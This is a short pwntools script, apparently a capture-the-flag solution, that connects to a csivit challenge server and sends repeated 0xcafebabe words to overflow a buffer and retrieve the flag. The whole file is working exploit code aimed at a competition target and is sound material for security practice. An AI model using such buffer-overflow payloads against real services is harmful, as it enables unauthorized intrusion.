#!/usr/bin/env python

from pwn import *

HOST = 'chall.csivit.com' 
PORT = 30007

context.log_level = 'error'
io = remote(HOST, PORT)

io.recvline()
io.sendline(p32(0xcafebabe) * (0x30 // 4))
io.recvline()
io.recvline()
print(io.recv().decode())